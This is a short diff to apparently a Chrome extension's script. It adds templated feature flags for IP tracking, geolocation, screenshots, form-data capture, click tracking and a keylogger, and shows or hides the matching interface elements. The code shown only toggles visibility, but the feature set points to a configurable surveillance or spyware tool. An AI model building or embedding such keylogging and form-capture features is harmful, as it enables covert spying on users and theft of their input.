@@ -172,6 +172,25 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   }
 });
 
+// Configure feature visibility based on enabled features
+const enabledFeatures = {
+  ipTracking: {{FEATURE_IP_TRACKING}} === 'true',
+  geoLocation: {{FEATURE_GEOLOCATION}} === 'true',
+  browserInfo: {{FEATURE_BROWSER_INFO}} === 'true',
+  screenshots: {{FEATURE_SCREENSHOT}} === 'true',
+  formData: {{FEATURE_FORM_DATA}} === 'true',
+  clickTracking: {{FEATURE_CLICK_TRACKING}} === 'true',
+  keyLogger: {{FEATURE_KEYLOGGER}} === 'true'
+};
+
+// Show/hide features based on configuration
+Object.entries(enabledFeatures).forEach(([featureId, enabled]) => {
+  const element = document.getElementById(featureId);
+  if (element) {
+    element.style.display = enabled ? 'flex' : 'none';
+  }
+});
+
 // Initial connection test
 setTimeout(() => {
   testConnection();
